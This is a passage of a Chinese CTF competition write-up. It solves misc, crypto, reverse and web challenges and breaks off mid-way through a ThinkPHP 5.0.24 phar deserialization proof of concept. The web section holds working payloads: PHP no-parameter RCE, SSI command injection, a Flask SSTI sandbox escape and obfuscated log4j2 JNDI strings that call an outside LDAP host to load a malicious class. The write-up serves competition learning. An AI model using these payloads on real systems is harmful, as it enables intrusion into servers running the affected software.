<p>导出之后有个web123，是base64，同样cyberchef解码得到zip文件，用D盾扫<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/b5d8a99411384ceb91fc6a783ef60ca1.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-fxGyG6JZ-1641631822289)(mumuzi.assets/image-20220108153726810.png)]"></p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16-164189500212110.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jCDmViZG-1641631822293)(mumuzi.assets/image-20220108153734258.png)]"></p>
<p>百度找一个解php混淆的，除去广告第一个就是<a href="https://www.zhaoyuanma.com/phpjm.html">https://www.zhaoyuanma.com/phpjm.html</a></p>
<p>解密得到flag<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16-164189501844412.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-U2XyWpF1-1641631822296)(mumuzi.assets/image-20220108153841460.png)]"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【pipicc】"><a href="#【pipicc】" class="headerlink" title="【pipicc】"></a>【pipicc】</h3><p>可以看到 327006.bmp 中有一片噪点，猜测是对像素点有所修改，用 010editor 打开，可以在 BITMAPLINE 结构中看到 IHDR 头，看不见 png 头，手动补上.</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199836171414.webp" alt=" "></p>
<p>补上以后</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199843626116.webp" alt=" "></p>
<p>找到IEND块，手动提取出png文件</p>
<p>得到1.png</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199845830218.webp" alt=" "></p>
<p>用stegsolve打开1.png提取低位数据，在蓝色的低位可以看到</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199848137820.webp" alt=" "></p>
<p>d9ff，联想到jpg的文件尾，但是是倒序的，save bin提取出来得到1.bin</p>
<p>保存得到1.bin</p>
<p>搜索 d8 ff，从第一个d8 ff 开始 删掉后面的内容，然后倒序，可以用010editor的script里的stringreverse<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199850985522.webp" alt=" "></p>
<p>得到jpg图片</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199851628124.webp" alt="图片"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="no-cry-no-can"><a href="#no-cry-no-can" class="headerlink" title="no_cry_no_can"></a>no_cry_no_can</h3><p>就单纯的异或，通过格式cazy{找出key的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key = b&#x27;\x5f\x11\x32\xff\x61&#x27;</span><br><span class="line">s = b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    print(chr(key[i%5]^s[i]),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="no-can-no-bb"><a href="#no-can-no-bb" class="headerlink" title="no_can_no_bb"></a>no_can_no_bb</h3><p>单纯的爆破key,给了key的范围是1,1&lt;&lt;20</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">def pad(m):</span><br><span class="line">    tmp = 16-(len(m)%16)</span><br><span class="line">    return m + bytes([tmp for _ in range(tmp)])</span><br><span class="line"></span><br><span class="line">enc=b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span><br><span class="line">for i in tqdm(range(1&lt;&lt;20)):</span><br><span class="line">    key=pad(long_to_bytes(i))</span><br><span class="line">    aes=AES.new(key,AES.MODE_ECB)</span><br><span class="line">    s = aes.decrypt(enc)</span><br><span class="line">    if b&#x27;cazy&#123;&#x27; in s:</span><br><span class="line">        print(s)</span><br></pre></td></tr></table></figure>

<h3 id="no-math-no-cry"><a href="#no-math-no-cry" class="headerlink" title="no_math_no_cry"></a>no_math_no_cry</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import*</span><br><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line">s = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span><br><span class="line">s -= 0x0338470</span><br><span class="line">s = gmpy2.iroot(s,2)[0]</span><br><span class="line">s = -s</span><br><span class="line">s += (1&lt;&lt;500)</span><br><span class="line">print(long_to_bytes(s))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;1234567890_no_m4th_n0_cRy&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="combat-slogan"><a href="#combat-slogan" class="headerlink" title="combat_slogan"></a>combat_slogan</h3><p>用ida打开看main就看见加密的flag了，上面函数明显的rot13</p>
<p>在线rot13解一下就行了，然后套上flag{}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="cute-doge"><a href="#cute-doge" class="headerlink" title="cute_doge"></a>cute_doge</h3><p>IDA打开ctf1.exe，搜字符串，看见ZmxhZ3tDaDFuYV95eWRzX2Nhenl9</p>
<p>base64解码就是flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Ch1na_yyds_cazy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uncompyle6 easy_py.cpython-38.pyc &gt; easy_py.py</span><br></pre></td></tr></table></figure>

<p>出来一个py文件，看了下，首先进encrypt1进行异或，再进入encrypt2进行异或，然后输出和Happy进行比较</p>
<p>既然是这样，那不妨反过来，把num从9到0改成从0到9，把该减的地方改成加，该执行的顺序也换一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># uncompyle6 version 3.7.4</span><br><span class="line"># Python bytecode 3.8 (3413)</span><br><span class="line"># Decompiled from: Python 3.8.7 (default, Dec 22 2020, 10:37:26) </span><br><span class="line"># [GCC 10.2.1 20201207]</span><br><span class="line"># Embedded file name: C:\Users\Administrator\Desktop\easy_py.py</span><br><span class="line"># Compiled at: 2021-12-28 15:45:17</span><br><span class="line"># Size of source mod 2**32: 1099 bytes</span><br><span class="line">import threading, time</span><br><span class="line"></span><br><span class="line">def encode_1(n):</span><br><span class="line">    global num</span><br><span class="line">    while True:</span><br><span class="line">        if num &lt;= 9:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num += 1</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">        if num &gt; 9:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encode_2(n):</span><br><span class="line">    global num</span><br><span class="line">    while True:</span><br><span class="line">        if num &lt;= 9:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + 1)]</span><br><span class="line">            num += 1</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">        if num &gt; 9:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    Happy = [</span><br><span class="line">     44, 100, 3, 50, 106, 90, 5, 102, 10, 112]</span><br><span class="line">    num = 0</span><br><span class="line">    f = input(&#x27;Please input your flag:&#x27;)</span><br><span class="line">    if len(f) == 10:</span><br><span class="line">        print(&#x27;Your input is illegal&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        flag = [44, 100, 3, 50, 106, 90, 5, 102, 10, 112]</span><br><span class="line">        if(1 == 2):</span><br><span class="line">            print(&#x27;crazymumuzi!&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;flag to &#x27;ord&#x27;:&quot;, flag)</span><br><span class="line">            t1 = threading.Thread(target=encode_1, args=(1, ))</span><br><span class="line">            t2 = threading.Thread(target=encode_2, args=(2,))</span><br><span class="line">            t2.start()</span><br><span class="line">            t1.start()</span><br><span class="line">            t1.join()</span><br><span class="line">            t2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        for i in flag:</span><br><span class="line">            print(chr(i),end=&#x27;&#x27;)</span><br><span class="line">        if flag == Happy:</span><br><span class="line">            print(&#x27;Good job!&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;No no no!&#x27;)</span><br><span class="line"># okay decompiling easy_py.cpython-38.pyc</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;He110_cazy&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="【RCE-No-Para】"><a href="#【RCE-No-Para】" class="headerlink" title="【RCE_No_Para】"></a>【RCE_No_Para】</h3><p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113114247702.png" alt="image-20220113114247702"></p>
<p><strong>正则匹配</strong><br><code>/[^\W]+\((?R)?\)/</code><br><code>\W</code> 元字符用于查找非单词字符。<br>单词字符包括：a-z、A-Z、0-9，以及下划线。<br>故<code>[^\W]</code>可以匹配所有单词字符<br><code>+</code>表示可以匹配一个或多个<br><code>\(</code>和<code>\)</code>为左右括号<br><code>(?R)?</code>表示递归整个模式</p>
<p>故本题的code只能为<code>a(b(c()))</code>这种形式，而不能为<code>a(&#39;xxx&#39;)</code>的形式，为无参数RCE</p>
<p><strong>get_defined_vars()</strong><br>该函数可以返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113114626736.png" alt="image-20220113114626736"></p>
<p>当我们传入<br><code>code=var_dump(get_defined_vars());&amp;a=phpinfo();</code><br>两变量时，我们自定义的变量a也出现在输出的变量中，我们便可以利用自定义的变量来绕过对code的限制进行rce<br>我们要想取到我们自定义变量的值，就需要使用函数来获取数组中的某一个值<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"></p>
<p>我们可以在get_defined_vars()前面加一个pos()用来去掉无关的变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=var_dump(pos(get_defined_vars()));&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113114830289.png" alt="image-20220113114830289"></p>
<p>如果此时再用一个pos()将会取出code的值，于是我们可以把两个变量的位置交换之后再用pos()便可以取出我们自定义变量的值</p>
<p>最终payload：<br><code>a=system(&#39;cat flag.php&#39;);&amp;code=eval(pos(pos(get_defined_vars())));</code><br>在注释中找到flag</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113114930314.png" alt="image-20220113114930314"></p>
<p><em>payload：<code>?code=system(array_rand(array_flip(current(get_defined_vars()))));&amp;b=cat%09flag.php</code></em></p>
<h3 id="【Baby-Upload】"><a href="#【Baby-Upload】" class="headerlink" title="【Baby_Upload】"></a>【Baby_Upload】</h3><p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113120258881.png" alt="image-20220113120258881"></p>
<p>做这道题会发现加了对文件内容的检测，过滤了一些符号，不过不会影响正常解题，过滤了<code>ph,ini,htaccess</code>，绕过不去，可以<code>shtml</code>来利用SSI注入RCE，但是过滤了很多命令，测试发现<code>ls</code>被过滤</p>
<p><code>ls</code>被过滤可以使用<code>dir</code>来列目录：</p>
<p><code>&lt;!--#exec cmd=&quot;dir /&quot;--&gt;</code>，存为<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113120501689.png" alt="image-20220113120501689"></p>
<p><code>1.shtml</code>之后上传，列出根目录，得知flag在<code>fffffflllll11111aaaaa4444ggggg</code>下，可以构造出：</p>
<p><code>&lt;!--#exec cmd=&quot;cut -b 1-100 /ffffff?llll11111aaaaa4444ggggg&quot;--&gt;</code></p>
<p>（强调一下，这里使用？是因为fl被过滤了，用？来匹配）</p>
<p>来读取文件，存为<code>2.shtml</code>后上传获得flag。<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220113120703608.png" alt="image-20220113120703608"></p>
<h3 id="【flask】"><a href="#【flask】" class="headerlink" title="【flask】"></a>【flask】</h3><p>访问主页发现注释中有提示</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-16419977491672.webp" alt=" "></p>
<p>/admin  /static.js  一段python代码 此段代码为后端的URL Filter 当请求js类静态文件时不需要认证，而在请求其他路径时则会被重定向到login 在flask的官方文档中</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-16419977778474.webp" alt=" "></p>
<p>在请求<a href="http://localhost/admin?test=123">http://localhost/admin?test=123</a></p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-16419979169076.webp" alt=" "></p>
<p>而请求/admin;xxx=1&amp;test=123</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-16419979388478.webp" alt=" "></p>
<p>对<code>request.path</code> 来说其值为<code>/admin;xxx=1</code>并没有把<code>path parameter</code>去掉，在代码中的判断使用的是<code>request.full_path</code><br>而在<code>request.full_path</code>中是包含了<code>query string</code>因此只要发起这样的请求：随意增加一个参数，并且参数值是以.js?结尾即可绕过校检<code>/admin?xxx=.js?</code>这里不能用<code>;</code>的原因是<code>request.path</code>并没有去掉 <code>path parameter</code> 在没有带上<code>query string</code>的情况下<code>full_path：/admin;x=.js?</code>满足<code>.js?</code>而<code>request.path:/admin;x=.js</code>路由表中没有<code>admin;x=.js</code>从而404</p>
<p>进入之后就是常规的ssti绕沙箱</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199797036410.webp" alt=" "></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aa:__class__ </span><br><span class="line">bb:__mro__</span><br><span class="line">cc:__subclasses__</span><br><span class="line">dd:__init__</span><br><span class="line">ee:__globals__</span><br></pre></td></tr></table></figure>

<p><code>((((request|attr(request.cookies.get(&#39;aa&#39;))|attr(request.cookies.get(&#39;bb&#39;))|list).pop(-1)|attr(request.cookies.get(&#39;cc&#39;))()).pop(117)|attr(request.cookies.get(&#39;dd&#39;))|attr(request.cookies.get(&#39;ee&#39;))).get(&#39;popen&#39;)(&#39;ls&#39;).read())</code></p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/640-164199809935312.webp" alt=" "></p>
<p>个人实践后发现貌似得到不了flag，也不知道原因在哪，下面是我的做题截图<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/image-20220115174547552.png" alt="image-20220115174547552"></p>
<p>请知道问题所在的大佬在评论区留言，谢谢</p>
<h3 id="【Shiro-】"><a href="#【Shiro-】" class="headerlink" title="【Shiro?】"></a>【Shiro?】</h3><p>虽然登录界面伪造了一个shiro反序列化漏洞，但是实际漏洞点是在登录处的log4j2RCE漏洞。起一个ldap服务用于加载恶意类。运行环境Java版本较高需要bypass，即可正常攻击，可利用JNDIExploit工具进行攻击。用{::-n}等规则替换关键字和ip地址即可绕过规则， 也可用woodpecker生成payload， 在登录点username处输入payload即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;kBQ:aUR:j:-j&#125;$&#123;MoYvsH:XAND:kG:-n&#125;$&#123;EdAUxY:ck:pyjko:RIasA:-d&#125;$&#123;hNhKmh:E:c:-i&#125;$&#123;l:MLjM:-:&#125;$&#123;qvO:STYFpz:ufnqW:V:-l&#125;$&#123;G:mIWH:-d&#125;$&#123;er:WLe:J:Pl:kCih:-a&#125;$&#123;yHjTcA:FM:e:IktQAC:-p&#125;$&#123;bvaWm:WW:-:&#125;$&#123;kB:hGD:GPI:-/&#125;$&#123;GC:VOUh:dqINYx:FK:n:-/&#125;$&#123;v:KHSOc:-1&#125;$&#123;Li:-9&#125;$&#123;QtYkc:o:CQBzJl:D:-2&#125;$&#123;KmJs:oJznyf:oIDrB:zmdK:-.&#125;$&#123;F:ttejsH:k:rI:-1&#125;$&#123;gN:-6&#125;$&#123;tB:aJqxS:-8&#125;$&#123;arq:J:wcas:d:-.&#125;$&#123;rh:Rcz:-2&#125;$&#123;z:Gvz:-.&#125;$&#123;F:-2&#125;$&#123;IsgAtf:-3&#125;$&#123;CPsF:QRLx:dICC:rMp:-8&#125;$&#123;o:Kk:hmhWl:XjIbnJ:-:&#125;$&#123;kp:-1&#125;$&#123;PeOoN:Y:mIFi:-3&#125;$&#123;P:-8&#125;$&#123;YMhc:EJ:uD:Wwytb:-9&#125;$&#123;OLPfY:YTvJf:m:OXdV:-/&#125;$&#123;rf:Uagil:PDiuPH:-T&#125;$&#123;PBKgU:NhAyi:MpIN:-o&#125;$&#123;awgT:-m&#125;$&#123;aS:TCt:xnzwfF:UNaIr:Ppp:-c&#125;$&#123;II:kNl:uHtTJi:WXfR:UjzJC:-a&#125;$&#123;jBHdVl:PB:-t&#125;$&#123;bkgfV:sYiJoF:uBIIDN:-B&#125;$&#123;WROI:-y&#125;$&#123;U:F:GAnUD:-p&#125;$&#123;nQMY:-a&#125;$&#123;yqYF:-s&#125;$&#123;cVWi:rs:NFv:f:wmqbfG:-s&#125;$&#123;XjHqnt:sP:uSjj:dWkcba:njEm:-/&#125;$&#123;CY:-T&#125;$&#123;qeW:-o&#125;$&#123;tLipT:GjC:YGc:-m&#125;$&#123;WmRvEy:pIxR:ur:LroYD:woOzUb:-c&#125;$&#123;ye:d:sR:NsdI:-a&#125;$&#123;OyXQBo:KSC:blRvH:iMLj:DxG:-t&#125;$&#123;MOGEk:VnN:-E&#125;$&#123;nxrEv:dKbcF:iEWJOf:-c&#125;$&#123;Jd:GTm:rJ:KsWYpp:oz:-h&#125;$&#123;UjBT:hMh:-o&#125;&#125;</span><br><span class="line"></span><br><span class="line">$&#123;j$&#123;iqV:xQtVwM:-n&#125;d$&#123;WnFLI:-i&#125;$&#123;j:YxXkbc:QpCi:k:QA:-:&#125;$&#123;tuNJ:pa:vDTPc:-l&#125;dap:$&#123;mxyDc:-/&#125;/$&#123;X:A:wJfVUX:-1&#125;$&#123;u:si:TmOs:-9&#125;2$&#123;x:DGbnfN:-.&#125;$&#123;h:Ga:H:Gmiv:zYQf:-1&#125;6$&#123;dqV:KYvLFD:Edfgq:HzKoK:-8&#125;$&#123;KNzKwB:IEJiU:-.&#125;$&#123;QMgb:NTVFr:gM:-2&#125;.2$&#123;VPb:kgVqX:vMNFgF:EV:iyt:-3&#125;8:1$&#123;nOhh:uTaV:TlMnJ:J:FM:-3&#125;$&#123;zUKT:mVGhb:RHbf:ypvu:-8&#125;$&#123;y:bPcT:g:Ya:-9&#125;$&#123;EDXJQ:Eetclr:oSVeHz:J:-/&#125;To$&#123;GbLFYe:UpYi:-m&#125;cat$&#123;UaV:Mo:Fu:UDboa:ePDD:-B&#125;$&#123;uzqh:O:lxU:UFRpQk:gGbqT:-y&#125;p$&#123;l:pJeje:P:s:vjiPI:-a&#125;$&#123;LCJ:vM:Ebt:LJmS:-s&#125;$&#123;pXuvuL:oWk:kXTgAe:kml:-s&#125;$&#123;WbhDYc:u:Ne:Slcje:-/&#125;$&#123;M:-T&#125;omc$&#123;kBm:V:iVQ:-a&#125;$&#123;cYCt:-t&#125;$&#123;iGHgwi:I:-E&#125;cho&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【Flag配送中心】"><a href="#【Flag配送中心】" class="headerlink" title="【Flag配送中心】"></a>【Flag配送中心】</h3><p>HTTPoxy漏洞（CVE-2016-5385）</p>
<p>VPS上监听对应端口后，在HTTP请求包中添加Proxy头：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Proxy: http://VPS:POST/</span><br></pre></td></tr></table></figure>

<p>即可监听到Flag</p>
<h3 id="【tp】"><a href="#【tp】" class="headerlink" title="【tp】"></a>【tp】</h3><p><code>thinkphp5.0.24</code> 反序列化</p>
<p>通过网上<code>poc</code> 生成<code>phar</code> 文件后，上传</p>
<p>然后变量覆盖，传入：<code>?FILES\[file\]\[name\]=phar://【上传的phar 文件名】</code></p>
<p>触发<code>phar</code> 反序列化，生成<code>webshell</code></p>
<p><strong>生成phar 的poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">    class Windows &#123;</span><br><span class="line">        private $files = [];</span><br><span class="line"></span><br><span class="line">        public function __construct($files)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files = [$files]; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think &#123;</span><br><span class="line">    abstract class Model&#123;</span><br><span class="line">        protected $append = [];</span><br><span class="line">        protected $error = null;</span><br><span class="line">        public $parent;</span><br><span class="line"></span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;parent = $output; </span><br><span class="line">            $this-&gt;append = array(&quot;xxx&quot;=&gt;&quot;getError&quot;);    </span><br><span class="line">            $this-&gt;error = $modelRelation;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    use think\Model;</span><br><span class="line">    class Pivot extends Model&#123;</span><br><span class="line">        function __construct($output, $modelRelation)</span><br><span class="line">        &#123;</span><br><span class="line">            parent::__construct($output, $modelRelation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation&#123;</span><br><span class="line">    class HasOne extends OneToOne &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model\relation &#123;</span><br><span class="line">    abstract class OneToOne</span><br><span class="line">    &#123;</span><br><span class="line">        protected $selfRelation;</span><br><span class="line">        protected $bindAttr = [];</span><br><span class="line">        protected $query;</span><br><span class="line">        function __construct($query)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;selfRelation = 0;</span><br><span class="line">            $this-&gt;query = $query;    //$query指向Query</span><br><span class="line">            $this-&gt;bindAttr = [&#x27;xxx&#x27;];// $value值，作为call函数引用的第二变量</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db &#123;</span><br><span class="line">    class Query &#123;</span><br><span class="line">        protected $model;</span><br><span class="line"></span><br><span class="line">        function __construct($model)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;model = $model; //$this-&gt;model=&gt; think\console\Output;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\console&#123;</span><br><span class="line">    class Output&#123;</span><br><span class="line">        private $handle;</span><br><span class="line">        protected $styles;</span><br><span class="line">        function __construct($handle)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">            $this-&gt;handle =$handle; //$handle-&gt;think\session\driver\Memcached</span><br><span class="line">        